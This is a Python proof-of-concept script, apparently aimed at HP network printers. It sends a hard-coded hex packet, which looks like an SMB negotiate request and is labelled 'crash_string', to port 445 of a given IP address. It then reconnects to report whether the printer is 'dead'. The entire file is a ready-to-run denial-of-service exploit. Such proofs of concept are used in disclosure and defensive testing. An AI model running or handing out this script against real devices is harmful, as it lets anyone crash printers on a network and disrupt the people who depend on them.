#!/bin/python3

# Make sure to use python3
# Written by Christian Clay
# October 21, 2021

import socket
import sys
from time import sleep

# set up variables
if len(sys.argv) > 1:
    HOST = sys.argv[1]
    SMBPORT = 445
    crash_string = bytes.fromhex("00000085ff534d4282000000001853c80000000000000000000000000000000000000000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
else:
    print("./hp_poc.py <ip_address_of_printer>")
    exit()

# Connect to printer, send payload
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, SMBPORT))
        s.sendall(crash_string)
        print("[payload sent..]")
except OSError:
    print (HOST + " seems down. Is the printer connected to the network?")
    exit()

print ("[Now checking if payload worked]")
sleep(1)

# attempt connecton to printer, wait for timeout
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((HOST, SMBPORT))
except OSError:
    print (HOST + " is dead.")
